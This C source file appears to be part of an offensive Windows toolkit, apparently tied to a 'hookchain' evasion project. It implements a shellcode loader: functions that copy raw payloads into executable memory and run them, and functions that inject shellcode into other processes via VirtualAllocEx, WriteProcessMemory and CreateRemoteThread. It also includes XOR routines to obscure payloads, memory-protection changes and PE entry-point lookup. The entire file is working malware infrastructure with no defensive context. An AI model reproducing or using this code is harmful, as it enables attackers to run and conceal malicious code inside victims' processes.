#include <shellcode.h>
#include <hookchain.h>

SHELLCODE_CTX g_shellcode_ctx = {0};

BOOL Shellcode_Initialize(PSHELLCODE_CTX ctx) {
    if (!ctx) return FALSE;
    ZeroMemory(ctx, sizeof(SHELLCODE_CTX));
    ctx->protection = PAGE_EXECUTE_READWRITE;
    DebugPrint("[+] Shellcode context initialized");
    return TRUE;
}

VOID Shellcode_Cleanup(PSHELLCODE_CTX ctx) {
    if (!ctx) return;
    if (ctx->data) {
        free(ctx->data);
        ctx->data = NULL;
    }
    if (ctx->allocated_addr) {
        Shellcode_FreeMemory(ctx->allocated_addr, ctx->allocated_size);
        ctx->allocated_addr = NULL;
    }
    ZeroMemory(ctx, sizeof(SHELLCODE_CTX));
}

PVOID Shellcode_Execute(PBYTE shellcode, DWORD size) {
    if (!shellcode || size == 0) {
        DebugPrint("[-] Invalid shellcode parameters");
        return NULL;
    }
    
    PVOID exec_mem = Shellcode_AllocateMemory(size, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return NULL;
    
    memcpy(exec_mem, shellcode, size);
    DebugPrint("[+] Shellcode copied to 0x%p", exec_mem);
    
    void (*func)() = (void (*)())exec_mem;
    func();
    
    return exec_mem;
}

PVOID Shellcode_ExecuteEx(PBYTE shellcode, DWORD size, PVOID arg1, PVOID arg2) {
    if (!shellcode || size == 0) {
        DebugPrint("[-] Invalid shellcode parameters");
        return NULL;
    }
    
    PVOID exec_mem = Shellcode_AllocateMemory(size + 16, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return NULL;
    
    memcpy(exec_mem, shellcode, size);
    DebugPrint("[+] Shellcode copied to 0x%p with args", exec_mem);
    
    void (*func)(PVOID, PVOID) = (void (*)(PVOID, PVOID))exec_mem;
    func(arg1, arg2);
    
    return exec_mem;
}

BOOL Shellcode_ExecuteRemote(HANDLE hProcess, PBYTE shellcode, DWORD size) {
    if (!hProcess || !shellcode || size == 0) return FALSE;
    
    PVOID remote_mem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        DebugPrint("[-] Failed to allocate remote memory: %d", GetLastError());
        return FALSE;
    }
    
    SIZE_T bytes_written;
    if (!WriteProcessMemory(hProcess, remote_mem, shellcode, size, &bytes_written)) {
        DebugPrint("[-] Failed to write remote memory: %d", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (!hThread) {
        DebugPrint("[-] Failed to create remote thread: %d", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    DebugPrint("[+] Remote shellcode executed in process 0x%p", hProcess);
    return TRUE;
}

BOOL Shellcode_ExecuteRemoteEx(HANDLE hProcess, PBYTE shellcode, DWORD size, PVOID arg1, PVOID arg2) {
    if (!hProcess || !shellcode || size == 0) return FALSE;
    
    PVOID remote_mem = VirtualAllocEx(hProcess, NULL, size + 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        DebugPrint("[-] Failed to allocate remote memory: %d", GetLastError());
        return FALSE;
    }
    
    SIZE_T bytes_written;
    if (!WriteProcessMemory(hProcess, remote_mem, shellcode, size, &bytes_written)) {
        DebugPrint("[-] Failed to write remote memory: %d", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    PVOID args_mem = (PVOID)((PBYTE)remote_mem + size);
    PVOID args[2] = {arg1, arg2};
    if (!WriteProcessMemory(hProcess, args_mem, args, sizeof(args), &bytes_written)) {
        DebugPrint("[-] Failed to write arguments: %d", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, args_mem, 0, NULL);
    if (!hThread) {
        DebugPrint("[-] Failed to create remote thread: %d", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    DebugPrint("[+] Remote shellcode executed with args in process 0x%p", hProcess);
    return TRUE;
}

PVOID Shellcode_AllocateMemory(DWORD size, DWORD protection) {
    if (size == 0) return NULL;
    
    DWORD protect = protection ? protection : PAGE_EXECUTE_READWRITE;
    PVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
    if (!addr) {
        DebugPrint("[-] Failed to allocate memory: %d", GetLastError());
        return NULL;
    }
    
    DebugPrint("[+] Allocated memory: 0x%p (size: %d)", addr, size);
    return addr;
}

BOOL Shellcode_FreeMemory(PVOID addr, DWORD size) {
    (void)size;
    if (!addr) return FALSE;
    
    if (!VirtualFree(addr, 0, MEM_RELEASE)) {
        DebugPrint("[-] Failed to free memory: %d", GetLastError());
        return FALSE;
    }
    
    DebugPrint("[+] Freed memory: 0x%p", addr);
    return TRUE;
}

BOOL Shellcode_LoadFromFile(LPCSTR filename, PBYTE *data, DWORD *size) {
    if (!filename || !data || !size) return FALSE;
    
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugPrint("[-] Failed to open file: %s (%d)", filename, GetLastError());
        return FALSE;
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == 0) {
        DebugPrint("[-] File is empty: %s", filename);
        CloseHandle(hFile);
        return FALSE;
    }
    
    PBYTE buffer = (PBYTE)malloc(file_size);
    if (!buffer) {
        DebugPrint("[-] Failed to allocate buffer");
        CloseHandle(hFile);
        return FALSE;
    }
    
    DWORD bytes_read;
    if (!ReadFile(hFile, buffer, file_size, &bytes_read, NULL) || bytes_read != file_size) {
        DebugPrint("[-] Failed to read file: %d", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    
    *data = buffer;
    *size = file_size;
    
    DebugPrint("[+] Loaded shellcode from: %s (%d bytes)", filename, file_size);
    return TRUE;
}

BOOL Shellcode_SaveToFile(LPCSTR filename, PBYTE data, DWORD size) {
    if (!filename || !data || size == 0) return FALSE;
    
    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugPrint("[-] Failed to create file: %s (%d)", filename, GetLastError());
        return FALSE;
    }
    
    DWORD bytes_written;
    if (!WriteFile(hFile, data, size, &bytes_written, NULL) || bytes_written != size) {
        DebugPrint("[-] Failed to write file: %d", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    DebugPrint("[+] Saved shellcode to: %s (%d bytes)", filename, size);
    return TRUE;
}

VOID Shellcode_XOR(PBYTE data, DWORD size, BYTE key) {
    if (!data || size == 0) return;
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
    DebugPrint("[+] XOR encrypt/decrypt complete (key: 0x%02x)", key);
}

VOID Shellcode_XOR_Extended(PBYTE data, DWORD size, PBYTE key, DWORD key_len) {
    if (!data || !key || key_len == 0 || size == 0) return;
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % key_len];
    }
    DebugPrint("[+] Extended XOR complete (key length: %d)", key_len);
}

BOOL Shellcode_ProtectMemory(PVOID addr, DWORD size, DWORD protection, DWORD *old_protection) {
    if (!addr || size == 0) return FALSE;
    
    DWORD old;
    if (!VirtualProtect(addr, size, protection, &old)) {
        DebugPrint("[-] Failed to change memory protection: %d", GetLastError());
        return FALSE;
    }
    
    if (old_protection) {
        *old_protection = old;
    }
    
    DebugPrint("[+] Memory protection changed: 0x%p (size: %d)", addr, size);
    return TRUE;
}

BOOL Shellcode_ChangeProtection(PVOID addr, DWORD size, DWORD new_protection) {
    return Shellcode_ProtectMemory(addr, size, new_protection, NULL);
}

BOOL Shellcode_Validate(PBYTE data, DWORD size) {
    if (!data || size == 0) return FALSE;
    
    DWORD valid_count = 0;
    for (DWORD i = 0; i < size && i < 64; i++) {
        if (data[i] != 0x00 && data[i] != 0xFF) {
            valid_count++;
        }
    }
    
    if (valid_count < 4) {
        DebugPrint("[-] Shellcode validation failed");
        return FALSE;
    }
    
    return TRUE;
}

PVOID Shellcode_GetEntryPoint(PBYTE data, DWORD size) {
    if (!data || size < sizeof(IMAGE_DOS_HEADER)) return data;
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return data;
    
    if (size < dos->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return data;
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return data;
    
    DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
    return data + entry_rva;
}

BOOL Shellcode_IsValidPE(PBYTE data, DWORD size) {
    if (!data || size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    if (size < dos->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return FALSE;
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    return TRUE;
}